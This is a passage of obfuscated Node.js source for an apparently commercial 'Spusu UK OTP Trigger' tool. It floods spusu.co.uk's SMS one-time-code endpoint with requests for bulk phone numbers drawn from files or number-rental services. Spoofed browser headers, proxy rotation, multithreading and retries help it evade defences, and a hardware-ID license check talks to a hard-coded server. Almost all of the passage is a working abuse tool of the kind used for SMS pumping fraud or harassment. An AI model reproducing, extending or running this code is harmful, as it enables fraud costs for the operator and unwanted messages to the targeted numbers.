    if (v243.startsWith('44')) v243 = '+' + v243;else {
      if (v243.startsWith('07') && v243.length === 0xb) v243 = "+44" + v243.substring(0x1);else v243 = '+' + v243;
    }
  }
  return v243;
}
async function triggerOTP(v245, v246 = {}) {
  const {
    onStatus: v247,
    proxy: v248,
    retries = 0x2
  } = v246;
  const v249 = getRandomClient(),
    v250 = v248 ? rotateSessionId(parseProxy(v248)) : null,
    v251 = formatPhone(v245);
  for (let v253 = 0x0; v253 <= retries; v253++) {
    try {
      v253 > 0x0 && (v247 && v247("Retry " + v253 + '/' + retries), await new Promise(v261 => setTimeout(v261, 0x3e8 + Math.random() * 0x5dc)));
      v247 && v247("Fetching session token...");
      const v254 = await globalSessionManager.getCookieString(v250);
      v247 && v247("Sending OTP to " + v251 + "...");
      const v255 = {};
      v255.accept = "*/*", v255["accept-language"] = "en-US,en;q=0.9", v255["content-type"] = "application/json", v255.cookie = v254, v255.internalusertoken = '', v255.origin = "https://www.spusu.co.uk", v255.priority = "u=1, i", v255.referer = "https://www.spusu.co.uk/login", v255.saleschannel = "Homepage", v255["sec-ch-ua"] = v249.secChUa, v255["sec-ch-ua-mobile"] = '?0', v255["sec-ch-ua-platform"] = v249.platform, v255["sec-fetch-dest"] = "empty", v255["sec-fetch-mode"] = "cors", v255["sec-fetch-site"] = "same-origin", v255["user-agent"] = v249.ua;
      const v256 = v255,
        v257 = {};
      v257.phoneNumber = v251;
      const v258 = JSON.stringify(v257),
        v259 = await sendRequest("https://www.spusu.co.uk/imoscmsapi/authentication/onetimecode/sms:generate", "POST", v256, v258, v250, 0x4e20);
      debugLog("triggerOTP", "Response status: " + v259.status, v259.data);
      if (v259.status === 0xc8) {
        const v262 = {};
        return v262.success = true, v262.phone = v251, v262.message = "OTP Sent", v262;
      }
      if (v259.status === 0x193 || v259.status === 0x191) {
        globalSessionManager.invalidate();
        if (v253 < retries) continue;
      }
      let v260 = "Status " + v259.status;
      try {
        const v263 = JSON.parse(v259.data);
        if (v263.message) v260 = v263.message;else {
          if (v263.error) v260 = v263.error;
        }
      } catch (v264) {
        if (v259.data && v259.data.length < 0x64) v260 = v259.data.trim();
      }
      if (v253 === retries) {
        const v265 = {};
        return v265.success = false, v265.phone = v251, v265.message = v260, v265;
      }
    } catch (v266) {
      if (v253 === retries) {
        const v267 = {};
        return v267.success = false, v267.phone = v251, v267.message = v266.message, v267;
      }
    }
  }
  const v252 = {};
  return v252.success = false, v252.phone = v251, v252.message = "Max retries reached", v252;
}
class Dashboard {
  constructor(v268) {
    this.totalNumbers = v268, this.processed = 0x0, this.successful = 0x0;
    this.failed = 0x0, this.startTime = Date.now();
  }
  ["addLog"](v269, v270) {
    let v271 = '';
    if (v270 === "success") v271 = chalk.hex("#00C9A7").bold(" ✦ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#00C9A7")("OTP Sent") + chalk.hex("#555555")(" → ") + chalk.hex("#FFD700").bold(v269.replace("Triggered OTP for ", ''));else {
      if (v270 === "retry") v271 = chalk.hex("#FFD700").bold(" ↻ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FFD700")(v269);else {
        const v272 = v269.match(/\+?\d{7,}/),
          v273 = v272 ? v272[0x0] : '',
          v274 = v269.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
        v271 = chalk.hex("#FF4466").bold(" ✗ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FF4466")(v273 ? '' + v273 : '') + chalk.hex("#555555")(v273 ? " → " : '') + chalk.hex("#888888")(v274);
      }
    }
    process.stdout.write("\r[K" + v271 + '\x0a'), this.render();
  }
  ["setStatus"](v275) {}
  ["update"]() {}
  ["render"]() {
    const v276 = this.processed / Math.max(this.totalNumbers, 0x1),
      v277 = (v276 * 0x64).toFixed(0x1);
    const v278 = Math.round(v276 * 0x14),
      v279 = 0x14 - v278,
      v280 = chalk.hex("#00C9A7")('█'.repeat(v278)) + chalk.hex("#333333")('░'.repeat(v279)),
      v281 = '\x20\x20' + chalk.hex("#00C9A7").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v280 + chalk.hex("#888888")('\x20' + v277 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#00C9A7").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
    process.stdout.write("\r[K" + v281);
  }
  ["stop"]() {
    process.stdout.write("[2K\r\n");
    const v282 = Math.floor((Date.now() - this.startTime) / 0x3e8);
    const v283 = Math.floor(v282 / 0x3c),
      v284 = v282 % 0x3c,
      v285 = v283 + 'm\x20' + v284 + 's';
    console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  SPUSU UK OTP TRIGGER — COMPLETE           ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v285.padEnd(0x6)) + "                       ") + C('║'));
    console.log(C("  ╚════════════════════════════════════════════╝\n"));
  }
}
function createReadline() {
  const v286 = {};
  return v286.input = process.stdin, v286.output = process.stdout, readline.createInterface(v286);
}
function sanitizePath(v287) {
  if (!v287) return '';
  let v288 = String(v287).trim();
  return v288 = v288.replace(/^["']+|["']+$/g, '').trim(), v288;
}
function cleanPath(v289) {
  if (!v289) return '';
  let v290 = sanitizePath(v289);
  return path.isAbsolute(v290) ? v290 : path.resolve(v290);
}
function promptText(v291, v292 = '') {
  return new Promise(v293 => {
    const v294 = createReadline();
    const v295 = v292 ? '\x20[' + v292 + ']' : '';
    v294.question(C("\n  " + v291 + v295 + '\x20'), v296 => {
      v294.close();
      let v297 = v296.trim() || v292;
      (v297.startsWith('\x22') && v297.endsWith('\x22') || v297.startsWith('\x27') && v297.endsWith('\x27')) && (v297 = v297.slice(0x1, -1).trim());
      v293(v297);
    });
  });
}
function selectOption(v298, v299) {
  return new Promise(v300 => {
    let v301 = 0x0;
    const fn3 = () => {
      {
        process.stdout.write("[2J[H");
        printHeader();
        console.log(C("\n  " + v298 + '\x0a'));
        v299.forEach((v302, v303) => {
          v303 === v301 ? console.log(B("  ❯ ") + C(v302.name)) : console.log(G("    " + v302.name));
        });
        console.log(G("\n  Use ↑/↓ arrows and Enter to select (or type number)."));
      }
    };
    fn3();
    const fn4 = (v304, v305) => {
        if (v305) {
          if (v305.name === 'up') v301 = (v301 - 0x1 + v299.length) % v299.length, fn3();else {
            if (v305.name === "down") v301 = (v301 + 0x1) % v299.length, fn3();else {
              if (v305.name === "return") fn5(), v300(v299[v301].value);else v305.name === 'c' && v305.ctrl && (fn5(), process.exit(0x0));
            }
          }
        }
        if (v304 && !isNaN(parseInt(v304))) {
          const v306 = parseInt(v304);
          v306 >= 0x1 && v306 <= v299.length && (v301 = v306 - 0x1, fn3());
        }
      },
      fn5 = () => {
        process.stdin.removeListener("keypress", fn4);
        if (process.stdin.isTTY) process.stdin.setRawMode(false);
      };
    readline.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY) process.stdin.setRawMode(true);
    process.stdin.resume();
    process.stdin.on("keypress", fn4);
  });
}
async function runWizard() {
  let v307 = 0x1,
    v308 = "file",
    v309 = "numbers.txt";
  let v310 = '',
    v311 = '5',
    v312 = '';
  let v313 = '2';
  let v314 = null,
    v315 = null,
    v316 = null,
    v317 = null;
  while (v307 <= 0x5) {
    if (v307 === 0x1) {
      const v318 = {};
      v318.name = "📁 Target Numbers from File", v318.value = "file";
      const v319 = {};
      v319.name = "⚡ NexaOTP Service (Auto Feed)", v319.value = "nexa";
      const v320 = {};
      v320.name = "⚡ Voltx (2oo9 Cloud)", v320.value = "voltx";
      const v321 = {};
      v321.name = "🔥 Stex (2oo9 Cloud)", v321.value = "stex";
      const v322 = {};
      v322.name = "📱 SMS Bower (Auto Feed)", v322.value = "smsbower";
      const v323 = {};
      v323.name = "⚡ Zenex (Auto Feed)", v323.value = "zenex", v308 = await selectOption("SELECT NUMBER SOURCE", [v318, v319, v320, v321, v322, v323]), v307 = 0x2;
    } else {
      if (v307 === 0x2) {
        if (v308 === "single") {
          v310 = await promptText("Enter target phone number (e.g. +447781519100):", '');
          if (v310.toLowerCase() === "back") {
            v307 = 0x1;
            continue;
          }
          v307 = 0x3;
        } else {
          if (v308 === "file") {
            const v324 = {};
            v324.name = "✏️ Custom File Path", v324.value = "custom";
            const v325 = {};
            v325.name = "⬅️ Go Back", v325.value = "back";
            const v326 = await selectOption("SELECT TARGET NUMBERS FILE", [v324, v325]);
            if (v326 === "back") {
              v307 = 0x1;
              continue;
            }
            if (v326 === "custom") {
              const v327 = await promptText("Enter Numbers File Path:", "numbers.txt");
              if (v327.toLowerCase() === "back") continue;
              const v328 = cleanPath(v327);
              if (!fs.existsSync(v328)) {
                console.log(R("\n  ✗ File not found: " + v328 + '\x0a')), await new Promise(v329 => setTimeout(v329, 0x7d0));
                continue;
              }
              v309 = v328;
            } else {
              v309 = v326;
              if (!fs.existsSync(v309)) {
                const v330 = [path.join(__dirname, "numbers.txt"), path.join(__dirname, "phone.txt"), path.join(__dirname, '..', "numbers.txt"), path.join(__dirname, '..', '..', "User", "numbers.txt")].find(v331 => fs.existsSync(v331));
                if (v330) v309 = v330;else try {
                  fs.writeFileSync(v309, '');
                } catch (v332) {}
              }
            }
            v307 = 0x3;
          } else {
            if (v308 === "voltx" || v308 === "stex") {
              const v333 = v308 === "voltx" ? "Voltx" : "Stex",
                v334 = v308 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
                v335 = v308 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/getnum" : "/MXS47FLFX0U/tness/@public/api/getnum",
                v336 = v308 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/console" : "/MXS47FLFX0U/tness/@public/api/console";
              let v337 = '',
                v338 = [],
                v339 = 0x32,
                v340 = false,
                v341 = 0x1;
              while (v341 <= 0x3 && !v340) {
                process.stdout.write("[2J[H"), printHeader();
                if (v341 === 0x1) {
                  if (fs.existsSync(v334)) {
                    v337 = fs.readFileSync(v334, "utf8").trim();
                    const v342 = {};
                    v342.name = "Use saved key", v342.value = "use";
                    const v343 = {};
                    v343.name = "Enter new key", v343.value = "new";
                    const v344 = {};
                    v344.name = "Remove saved key", v344.value = "remove";
                    const v345 = {};
                    v345.name = "⬅️ Back", v345.value = "back";
                    const v346 = await selectOption(v333 + " key found (" + v337.substring(0x0, 0xa) + "...)", [v342, v343, v344, v345]);
                    if (v346 === "back") {
                      v340 = true;
                      break;
                    }
                    if (v346 === "remove") fs.existsSync(v334) && fs.unlinkSync(v334), v337 = '';else v346 === "new" && (v337 = '');
                  }
                  if (!v337) {
                    const v347 = await promptText("Enter " + v333 + " API Key (mauthapi):", '');
                    if (v347.toLowerCase() === "back") {
                      v340 = true;
                      break;
                    }
                    v337 = v347;
                    const v348 = {};
                    v348.name = 'No', v348.value = 'no';
                    const v349 = await selectOption("Save key?", [{
                      'name': "Yes",
                      'value': "yes"
                    }, v348]);
                    if (v349 === "yes" && v337) fs.writeFileSync(v334, v337, "utf8");
                  }
                  if (v337) v341 = 0x2;
                } else {
                  if (v341 === 0x2) {
                    const v350 = await selectOption("How to select ranges?", [{
                      'name': "🔍 Auto Range Finder (scan console)",
                      'value': "auto"
                    }, {
                      'name': "✏️  Enter manually",
                      'value': "manual"
                    }, {
                      'name': "⬅️ Back",
                      'value': "back"
                    }]);
                    if (v350 === "back") {
                      v341 = 0x1;
                      continue;
                    }
                    if (v350 === "auto") {
                      const v351 = await autoRangeFinderFor2Oo(v337, v336, selectOption, promptText);
                      v351 && v351.length > 0x0 && (v338 = v351, v341 = 0x3);
                    } else {
                      v338 = [];
                      let v352 = true;
                      while (v352) {
                        const v353 = await promptText("Enter range #" + (v338.length + 0x1) + " (e.g. 447XXXXXXXX) or 'back':", '');
                        if (v353.toLowerCase() === "back") {
                          if (v338.length === 0x0) break;else {
                            v338.pop();
                            continue;
                          }
                        }
                        if (v353) v338.push(v353);
                        const v354 = {};
                        v354.name = "Yes", v354.value = "yes";
                        const v355 = {};
                        v355.name = 'No', v355.value = 'no';
                        const v356 = await selectOption("Added " + v338.length + ". Add another?", [v354, v355]);
                        if (v356 === 'no') v352 = false;
                      }
                      if (v338.length > 0x0) v341 = 0x3;
                    }
                  } else {
                    if (v341 === 0x3) {
                      const v357 = await promptText("How many numbers? [default:50]:", '50');
                      if (v357.toLowerCase() === "back") {
                        v341 = 0x2;
                        continue;
                      }
                      v339 = parseInt(v357) || 0x32;
                      const v358 = {};
                      v358.provider = v308, v358.apiKey = v337, v358.getPath = v335, v358.consolePath = v336, v358.ranges = v338, v358.totalCount = v339, v315 = v358, v341 = 0x4;
                    }
                  }
                }
              }
              if (v340) {
                v307 = 0x1;
                continue;
              }
              v307 = 0x3;
            } else {
              if (v308 === "smsbower") {
                let v359 = '',
                  v360 = 'fb',
                  v361 = '0',
                  v362 = "0.5",
                  v363 = 0x32,
                  v364 = 0x1,
                  v365 = false;
                while (v364 <= 0x4 && !v365) {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v364 === 0x1) {
                    if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                      v359 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                      const v366 = {};
                      v366.name = "Use saved key", v366.value = "use";
                      const v367 = {};
                      v367.name = "Enter new key", v367.value = "new";
                      const v368 = {};
                      v368.name = "Remove saved key", v368.value = "remove";
                      const v369 = {};
                      v369.name = "⬅️ Back", v369.value = "back";
                      const v370 = await selectOption("SMS Bower key found (" + v359.substring(0x0, 0xa) + "...)", [v366, v367, v368, v369]);
                      if (v370 === "back") {
                        v365 = true;
                        break;
                      }
                      if (v370 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v359 = '';else {
                        if (v370 === "new") v359 = '';
                      }
                    }
                    if (!v359) {
                      v359 = await promptText("Enter SMS Bower API Key:", '');
                      if (v359.toLowerCase() === "back") {
                        v365 = true;
                        break;
                      }
                      const v371 = {};
                      v371.name = 'No', v371.value = 'no';
                      const v372 = await selectOption("Save key?", [{
                        'name': "Yes",
                        'value': "yes"
                      }, v371]);
                      if (v372 === "yes" && v359) fs.writeFileSync(SMSBOWER_KEY_FILE, v359, "utf8");
                    }
                    if (v359) v364 = 0x2;
                  } else {
                    if (v364 === 0x2) {
                      v360 = await promptText("Service code [default: fb]:", 'fb');
                      if (v360.toLowerCase() === "back") {
                        v364 = 0x1;
                        continue;
                      }
                      v360 = v360 || 'fb', v364 = 0x3;
                    } else {
                      if (v364 === 0x3) {
                        v361 = await promptText("Country code (0 = any) [default: 0]:", '0');
                        if (v361.toLowerCase() === "back") {
                          v364 = 0x2;
                          continue;
                        }
                        v361 = v361 || '0';
                        const v373 = await promptText("Max price per number [default: 0.5]:", "0.5");
                        v362 = v373 || "0.5", v364 = 0x4;
                      } else {
                        if (v364 === 0x4) {
                          const v374 = await promptText("How many numbers? [default: 50]:", '50');
                          if (v374.toLowerCase() === "back") {
                            v364 = 0x3;
                            continue;
                          }
                          v363 = parseInt(v374) || 0x32;
                          const v375 = {};
                          v375.apiKey = v359, v375.service = v360, v375.country = v361, v375.maxPrice = v362, v375.totalCount = v363, v316 = v375, v364 = 0x5;
                        }
                      }
                    }
                  }
                }
                if (v365) {
                  v307 = 0x1;
                  continue;
                }
                v307 = 0x3;
              } else {
                if (v308 === "zenex") {
                  let v376 = '',
                    v377 = [],
                    v378 = 0x32,
                    v379 = 0x1,
                    v380 = false;
                  while (v379 <= 0x3 && !v380) {
                    process.stdout.write("[2J[H"), printHeader();
                    if (v379 === 0x1) {
                      if (fs.existsSync(ZENEX_KEY_FILE)) {
                        v376 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                        const v381 = {};
                        v381.name = "Use saved key", v381.value = "use";
                        const v382 = {};
                        v382.name = "Enter new key", v382.value = "new";
                        const v383 = {};
                        v383.name = "Remove saved key", v383.value = "remove";
                        const v384 = {};
                        v384.name = "⬅️ Back", v384.value = "back";
                        const v385 = await selectOption("Zenex key found (" + v376.substring(0x0, 0xa) + "...)", [v381, v382, v383, v384]);
                        if (v385 === "back") {
                          v380 = true;
                          break;
                        }
                        if (v385 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v376 = '';else {
                          if (v385 === "new") v376 = '';
                        }
                      }
                      if (!v376) {
                        v376 = await promptText("Enter Zenex API Key (mapikey):", '');
                        if (v376.toLowerCase() === "back") {
                          v380 = true;
                          break;
                        }
                        const v386 = {};
                        v386.name = "Yes", v386.value = "yes";
                        const v387 = {};
                        v387.name = 'No', v387.value = 'no';
                        const v388 = await selectOption("Save key?", [v386, v387]);
                        if (v388 === "yes" && v376) fs.writeFileSync(ZENEX_KEY_FILE, v376, "utf8");
                      }
                      if (v376) v379 = 0x2;
                    } else {
                      if (v379 === 0x2) {
                        v377 = [];
                        let v389 = true;
                        while (v389) {
                          const v390 = await promptText("Enter range #" + (v377.length + 0x1) + " (e.g. 447XXXXXXXX) or 'back':", '');
                          if (v390.toLowerCase() === "back") {
                            if (v377.length === 0x0) {
                              v380 = true;
                              break;
                            } else {
                              v377.pop();
                              continue;
                            }
                          }
                          if (v390) v377.push(v390);
                          const v391 = {};
                          v391.name = "Yes", v391.value = "yes";
                          const v392 = {};
                          v392.name = 'No', v392.value = 'no';
                          const v393 = await selectOption("Added " + v377.length + ". Add another?", [v391, v392]);
                          if (v393 === 'no') v389 = false;
                        }
                        if (v377.length > 0x0) v379 = 0x3;
                      } else {
                        if (v379 === 0x3) {
                          const v394 = await promptText("How many numbers? [default: 50]:", '50');
                          if (v394.toLowerCase() === "back") {
                            v379 = 0x2;
                            continue;
                          }
                          v378 = parseInt(v394) || 0x32;
                          const v395 = {};
                          v395.apiKey = v376, v395.ranges = v377, v395.totalCount = v378, v317 = v395, v379 = 0x4;
                        }
                      }
                    }
                  }
                  if (v380) {
                    v307 = 0x1;
                    continue;
                  }
                  v307 = 0x3;
                } else {
                  let v396 = 0x1,
                    v397 = false,
                    v398 = '',
                    v399 = [],
                    v400 = 0x32;
                  while (v396 <= 0x3 && !v397) {
                    process.stdout.write("[2J[H"), printHeader();
                    if (v396 === 0x1) {
                      if (fs.existsSync(NEXA_KEY_FILE)) {
                        const v401 = fs.readFileSync(NEXA_KEY_FILE, "utf8").trim(),
                          v402 = {};
                        v402.name = "Yes, use saved key", v402.value = "yes";
                        const v403 = {};
                        v403.name = "No, enter new key", v403.value = 'no';
                        const v404 = {};
                        v404.name = "Delete saved key", v404.value = "delete";
                        const v405 = {};
                        v405.name = "⬅️ Go Back", v405.value = "back";
                        const v406 = await selectOption("Found saved API Key (..." + v401.slice(-4) + "). Use it?", [v402, v403, v404, v405]);
                        if (v406 === "back") {
                          v397 = true;
                          break;
                        }
                        if (v406 === "yes") v398 = v401;else {
                          if (v406 === "delete") {
                            try {
                              fs.unlinkSync(NEXA_KEY_FILE);
                            } catch (v407) {}
                            v398 = '';
                          }
                        }
                      }
                      if (!v398) {
                        const v408 = await promptText("Enter NexaOTP API Key:", '');
                        if (v408.toLowerCase() === "back") {
                          v397 = true;
                          break;
                        }
                        v398 = v408;
                        const v409 = {};
                        v409.name = "Yes", v409.value = "yes";
                        const v410 = {};
                        v410.name = 'No', v410.value = 'no';
                        const v411 = await selectOption("Save key?", [v409, v410]);
                        if (v411 === "yes" && v398) fs.writeFileSync(NEXA_KEY_FILE, v398, "utf8");
                      }
                      if (v398) v396 = 0x2;
                    } else {
                      if (v396 === 0x2) {
                        v399 = [];
                        let v412 = true;
                        while (v412) {
                          const v413 = await promptText("Enter range #" + (v399.length + 0x1) + " (e.g. 447XXXXXXXX) or 'back':", '');
                          if (v413.toLowerCase() === "back") {
                            if (v399.length === 0x0) {
                              v396 = 0x1;
                              break;
                            } else {
                              v399.pop();
                              continue;
                            }
                          }
                          if (v413) v399.push(v413);
                          const v414 = {};
                          v414.name = "Yes", v414.value = "yes";
                          const v415 = {};
                          v415.name = 'No', v415.value = 'no';
                          const v416 = await selectOption("Added " + v399.length + ". Add another?", [v414, v415]);
                          if (v416 === 'no') v412 = false;
                        }
                        if (v399.length > 0x0) v396 = 0x3;
                      } else {
                        if (v396 === 0x3) {
                          const v417 = await promptText("How many numbers to fetch? [default: 50]:", '50');
                          if (v417.toLowerCase() === "back") {
                            v396 = 0x2;
                            continue;
                          }
                          v400 = parseInt(v417) || 0x32;
                          const v418 = {};
                          v418.apiKey = v398, v418.ranges = v399, v418.totalCount = v400, v418.serverEndpoint = "/api/v1/numbers/get", v314 = v418, v396 = 0x4;
                        }
                      }
                    }
                  }
                  if (v397) {
                    v307 = 0x1;
                    continue;
                  }
                  v307 = 0x3;
                }
              }
            }
          }
        }
      } else {
        if (v307 === 0x3) {
          v311 = await promptText("Concurrency / Thread count [default: 5]:", '5');
          if (v311.toLowerCase() === "back") {
            v307 = 0x2;
            continue;
          }
          v307 = 0x4;
        } else {
          if (v307 === 0x4) {
            const v419 = {};
            v419.name = "✏️ Custom Proxy File", v419.value = "custom";
            const v420 = {};
            v420.name = "🌐 Direct Connection (No Proxy)", v420.value = "none";
            const v421 = {};
            v421.name = "⬅️ Go Back", v421.value = "back";
            const v422 = await selectOption("SELECT PROXY CONFIGURATION", [v419, v420, v421]);
            if (v422 === "back") {
              v307 = 0x3;
              continue;
            }
            if (v422 === "none") v312 = '';else {
              if (v422 === "custom") {
                const v423 = await promptText("Enter Proxy File Path:", "proxies.txt");
                if (v423.toLowerCase() === "back") continue;
                const v424 = cleanPath(v423);
                if (!fs.existsSync(v424)) {
                  console.log(R("\n  ✗ File not found: " + v424 + '\x0a')), await new Promise(v425 => setTimeout(v425, 0x7d0));
                  continue;
                }
                v312 = v424;
              } else v312 = v422;
            }
            v307 = 0x5;
          } else {
            if (v307 === 0x5) {
              v313 = await promptText("Retry attempts per number [default: 2]:", '2');
              if (v313.toLowerCase() === "back") {
                v307 = 0x4;
                continue;
              }
              break;
            }
          }
        }
      }
    }
  }
  return {
    'numSource': v308,
    'singleNumber': v310,
    'numbersFile': v309,
    'threads': parseInt(v311) || 0x5,
    'proxiesFile': v312,
    'retries': parseInt(v313) || 0x2,
    'nexaConfig': v314,
    'twoOoConfig': v315,
    'smsBowerConfig': v316,
    'zenexConfig': v317
  };
}
function generateHWID() {
  const v426 = require('os'),
    v427 = v426.platform();
  try {
    if (v427 === "win32") {
      const v428 = execSync('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
        'stdio': "pipe",
        'timeout': 0x3a98
      }).toString().trim();
      if (!v428) throw new Error("No hardware data");
      const v429 = crypto.createHash("sha256").update(v428).digest("hex").toUpperCase();
      return "SKING-" + v429.substring(0x0, 0x8) + '-' + v429.substring(0x8, 0xc) + '-' + v429.substring(0xc, 0x10);
    } else {
      let v430 = [];
      try {
        const v434 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
          'stdio': "pipe",
          'timeout': 0x1388
        }).toString().trim();
        if (v434 && v434 !== "null") v430.push('A:' + v434);
      } catch (v435) {}
      try {
        if (fs.existsSync("/proc/cpuinfo")) {
          const v436 = fs.readFileSync("/proc/cpuinfo", "utf8"),
            v437 = v436.match(/Serial\s*:\s*(\S+)/i),
            v438 = v436.match(/Hardware\s*:\s*(.+)/i);
          if (v437 && v437[0x1] !== "0000000000000000") v430.push('S:' + v437[0x1].trim());
          if (v438) v430.push('H:' + v438[0x1].trim());
        }
      } catch (v439) {}
      try {
        if (fs.existsSync("/etc/machine-id")) {
          const v440 = fs.readFileSync("/etc/machine-id", "utf8").trim();
          if (v440) v430.push('M:' + v440);
        }
      } catch (v441) {}
      try {
        const v442 = v426.cpus(),
          v443 = v442 && v442.length > 0x0 ? v442[0x0].model : "UnknownCPU",
          v444 = v426.totalmem(),
          v445 = v426.release(),
          v446 = v426.hostname();
        v430.push('F:' + v443 + '|' + v444 + '|' + v445 + '|' + v446);
      } catch (v447) {}
      const v431 = v430.join('||'),
        v432 = crypto.createHash("sha256").update(v431).digest("hex").toUpperCase(),
        v433 = v426.platform() === "android" ? "ANKING-" : "SKING-";
      return v433 + v432.substring(0x0, 0x8) + '-' + v432.substring(0x8, 0xc) + '-' + v432.substring(0xc, 0x10);
    }
  } catch (v448) {
    return '';
  }
}
function verifyServerSignature(v449, v450) {
  if (!v450) return false;
  try {
    return crypto.verify(null, Buffer.from(v449, "utf8"), "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----", Buffer.from(v450, "base64"));
  } catch (v451) {
    return false;
  }
}
async function start() {
  const v452 = generateHWID();
  !v452 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(0x1));
  const v453 = generateHWID();
  v453 !== v452 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(0x1));
  printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("Spusu UK OTP Trigger         ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v452.padEnd(0x1d)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
  let v454 = false;
  const v455 = Date.now();
  try {
    const v471 = await new Promise((v472, v473) => {
      const v474 = {};
      v474.hwid = v452, v474.app_id = "spusu", v474.version = "1.0.0", v474.timestamp = v455;
      const v475 = JSON.stringify(v474);
      const v476 = {
        'hostname': "188.137.176.163",
        'port': 0xec1,
        'path': "/api/verify",
        'method': "POST",
        'headers': {
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v475)
        },
        'timeout': 0x2710
      };
      const v477 = http.request(v476, v478 => {
        let v479 = '';
        v478.on("data", v480 => v479 += v480), v478.on("end", () => {
          try {
            v472(JSON.parse(v479));
          } catch (v481) {
            v473(v481);
          }
        });
      });
      v477.on("error", v473);
      v477.on("timeout", function () {
        this.destroy();
        v473(new Error("Timeout"));
      }), v477.write(v475), v477.end();
    });
    if (v471) {
      v471.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(0x1));
      if (v471.status === "banned" || v471.status === "expired" || !v471.sig) {
        await new Promise(v485 => setTimeout(v485, 0x7d0));
        let v484 = String(v471.reason || "NOT REGISTERED");
        if (!v471.reason && !v471.sig) v484 = "NOT REGISTERED / REMOVED";
        console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — SPUSU TOOL      ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v452.padEnd(0x21)) + R('║')), console.error(R("  ║  Status : " + v484.padEnd(0x1a) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(0x1);
      }
      const v482 = v452 + "|spusu|1.0.0|" + v455;
      !verifyServerSignature(v482, v471.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(0x1));
      v454 = true;
      let v483 = v471.token;
      !v483 && (console.error(R("\n  ✗ Invalid Server Response: Missing Session Token. Aborting.\n")), process.exit(0x1)), setInterval(() => {
        !v483 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(0x1));
        const v486 = {};
        v486.hwid = v452, v486.app_id = "spusu", v486.token = v483;
        const v487 = JSON.stringify(v486),
          v488 = {
            'hostname': "188.137.176.163",
            'port': 0xec1,
            'path': "/api/ping",
            'method': "POST",
            'headers': {
              'Content-Type': "application/json",
              'Content-Length': Buffer.byteLength(v487)
            },
            'timeout': 0x1388
          },
          v489 = http.request(v488, v490 => {
            let v491 = '';
            v490.on("data", v492 => v491 += v492);
            v490.on("end", () => {
              try {
                const v493 = JSON.parse(v491);
                (v493.status === "banned" || v493.status === "expired" || v493.status === "revoked") && (console.error(R("\n  ✗ License revoked by server. Exiting...\n")), process.exit(0x1));
              } catch (v494) {}
            });
          });
        v489.on("error", () => {}), v489.write(v487), v489.end();
      }, 0xafc8);
    }
  } catch (v495) {
    console.error(R("\n  ✗ License verification connection error: " + v495.message + '\x0a')), process.exit(0x1);
  }
  !v454 && (console.error(R("\n  ✗ License unauthorized.\n")), process.exit(0x1));
  const v456 = await runWizard();
  let v457 = [];
  if (v456.singleNumber) v457 = [v456.singleNumber];else v456.numSource === "file" && fs.existsSync(v456.numbersFile) && (v457 = fs.readFileSync(v456.numbersFile, "utf8").split(/\r?\n/).map(v496 => v496.trim()).filter(v497 => v497 && !v497.startsWith('#')));
  let v458 = [];
